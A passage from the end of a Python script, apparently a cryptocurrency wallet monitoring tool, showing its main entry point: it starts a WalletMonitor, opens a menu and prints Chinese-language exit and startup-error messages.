        monitor = WalletMonitor()
        monitor.initialize_clients()
        
        # 自动进入主菜单
        monitor.main_menu()
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}👋 程序已退出{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}❌ 系统启动失败: {e}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 请检查网络连接和依赖安装{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    # 自动启动主程序
    main()
